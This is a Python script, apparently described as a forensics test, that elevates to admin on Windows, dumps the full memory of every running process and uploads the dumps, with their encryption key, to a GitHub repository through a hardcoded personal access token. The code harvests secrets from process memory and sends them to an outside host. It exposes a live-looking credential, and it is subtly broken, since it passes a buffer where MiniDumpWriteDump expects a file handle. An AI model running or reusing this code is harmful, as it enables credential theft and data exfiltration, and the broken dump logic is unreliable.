import psutil
import ctypes
import os
import base64
import requests
from cryptography.fernet import Fernet
from datetime import datetime
import subprocess
import sys
import platform

def restart_with_admin():
    if platform.system() != 'Windows':
        print("This script requires Windows platform.")
        sys.exit(1)

    if ctypes.windll.shell32.IsUserAnAdmin():
        print("Already running with administrative privileges.")
        return

    script_path = sys.argv[0]
    params = ' '.join([script_path] + sys.argv[1:])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

    sys.exit(0)


# Restart the script with admin privileges
restart_with_admin()


def acquire_memory_dump(pid, github_repo, github_token, encryption_key):
    if pid == 0:
        return None

    process_handle = None

    try:
        # Open the target process with required access rights
        process_handle = ctypes.windll.kernel32.OpenProcess(
            0x1F0FFF,  # PROCESS_ALL_ACCESS
            False,
            pid
        )

        # Create the memory dump using MiniDumpWriteDump
        memory_dump = ctypes.create_string_buffer(1024 * 1024)
        dump_size = ctypes.c_ulong(len(memory_dump))
        ctypes.windll.dbghelp.MiniDumpWriteDump(
            process_handle,
            pid,
            ctypes.byref(memory_dump),
            2,  # MiniDumpWithFullMemory
            None,
            None,
            None
        )

        # Convert the memory dump to bytes
        memory_dump_bytes = memory_dump.raw

        # Encrypt the memory dump
        cipher_suite = Fernet(encryption_key)
        encrypted_dump = cipher_suite.encrypt(memory_dump_bytes)

        # Upload the encrypted memory dump to GitHub
        url = f"https://api.github.com/repos/{github_repo}/contents/dump_file_{pid}.dmp"
        data = {
            "message": f"Upload encrypted memory dump for PID {pid}",
            "content": base64.b64encode(encrypted_dump).decode(),
            "encoding": "base64",
            "branch": "main"
        }
        headers = {
            "Authorization": f"Bearer {github_token}"
        }
        response = requests.put(url, headers=headers, json=data)
        response.raise_for_status()

        print(f"Memory dump for PID {pid} uploaded successfully.")

    except Exception as e:
        print(f"An error occurred during memory dump creation for PID {pid}. Error: {str(e)}")
        input("Press any key to exit...")
        sys.exit(1)

    finally:
        if process_handle:
            ctypes.windll.kernel32.CloseHandle(process_handle)


def run(github_repo, github_token):
    # Generate encryption key
    encryption_key = Fernet.generate_key()

    # Save encryption key to key_dmp.txt
    key_content = base64.b64encode(encryption_key).decode()
    url_key = f"https://api.github.com/repos/{github_repo}/contents/key_dmp.txt"
    data_key = {
        "message": "Upload encryption key",
        "content": key_content,
        "encoding": "base64",
        "branch": "main"
    }
    headers_key = {
        "Authorization": f"Bearer {github_token}"
    }
    response_key = requests.put(url_key, headers=headers_key, json=data_key)
    response_key.raise_for_status()

    print("Encryption key saved successfully.")

    # Get the list of all running processes and their PIDs
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        processes.append((proc.info['pid'], proc.info['name']))

    # Use the list of processes with their PIDs for memory dump creation
    for pid, _ in processes:
        print(f"Extracting memory for PID {pid}...")
        acquire_memory_dump(pid, github_repo, github_token, encryption_key)


# GitHub repository and personal access token
github_repo = "ck-prime/forensics_test2"
github_token = "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"

# Restart the script with admin privileges
restart_with_admin()

# Run the memory dump creation and upload process
run(github_repo, github_token)

# Create a timestamp
timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
timestamp_content = f"Extraction Timestamp: {timestamp}"

# Create the timestamp file
url_timestamp = f"https://api.github.com/repos/{github_repo}/contents/time_stamp_dmp.txt"
data_timestamp = {
    "message": "Upload timestamp file for memory dumps",
    "content": base64.b64encode(timestamp_content.encode()).decode(),
    "encoding": "base64",
    "branch": "main"
}
headers_timestamp = {
    "Authorization": f"Bearer {github_token}"
}
response_timestamp = requests.put(url_timestamp, headers=headers_timestamp, json=data_timestamp)
response_timestamp.raise_for_status()

if response_timestamp.status_code == 201:
    print("Timestamp file uploaded successfully.")
else:
    print("Error uploading timestamp file:", response_timestamp.text)

# Prompt user to press any key before exiting
input("Press any key to exit...")
